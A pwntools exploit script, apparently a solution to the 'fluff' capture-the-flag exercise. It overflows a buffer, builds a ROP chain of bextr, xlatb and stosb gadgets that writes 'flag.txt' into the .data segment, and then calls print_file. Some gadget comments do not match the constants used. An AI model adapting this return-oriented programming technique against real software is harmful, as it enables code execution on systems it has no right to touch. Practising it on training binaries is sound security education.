from pwn import *

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
r = ROP(e)

gs = '''
continue
'''

def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    else:
        return process(e.path)

p = start()

#x = cyclic(500)
#p.sendline(x)

padding = b'A' * 40
chain = padding

writeable_mem = 0x601029 #address of the .data segment
flagtxt = b'flag.txt' # string we want to be inside of print_file

# want to find addresses of each letter in flag.txt in the binary
# also have to add in the offset which is 0x400000
letteraddresses = []
for char in flagtxt:
      letteraddress = hex(read('fluff').find(char) + 0x400000)
      letteraddresses.append(letteraddress)

# initial rax value found by breakpoint at pwnme+150 and display rax
currrax = 0xb

for i in range(8):
  # if on first character use the initial rax value
  if(i != 0):
    currrax = flagtxt[i-1] # else set it to the previous character
  chain += p64(0x40062a) # pop rdx pop rcx add rcx, 0x3ef bextr rbx, rcx, rdx; ret;
  # want RCX = current letter address and RDX = index+length
  chain += p64(0x4000) # length = 40 because 64 bits and index = 00
  # have to subtract the last character stored in currrax and 0x3ef2 to negate the add operation in gadget
  chain += p64(int(letteraddresses[i], 16) - currrax - 0x3ef2)
  # xlatb will move the bextr result rbx into al
  chain += p64(0x400628) # xlatb ret;
  chain += p64(0x4006a3) # pop rdi; ret;
  chain += p64(writeable_mem+i)
  # will have rdi point at our string stored in al
  chain += p64(0x400639) # stosb byte [rdi], al; ret;

chain += p64(0x4006a3) # pop rdi; ret;
chain += p64(writeable_mem)
chain += p64(e.sym['print_file'])

p.recvuntil(">")
p.sendline(chain)

response = p.recvall().decode()
print(response)

p.interactive()
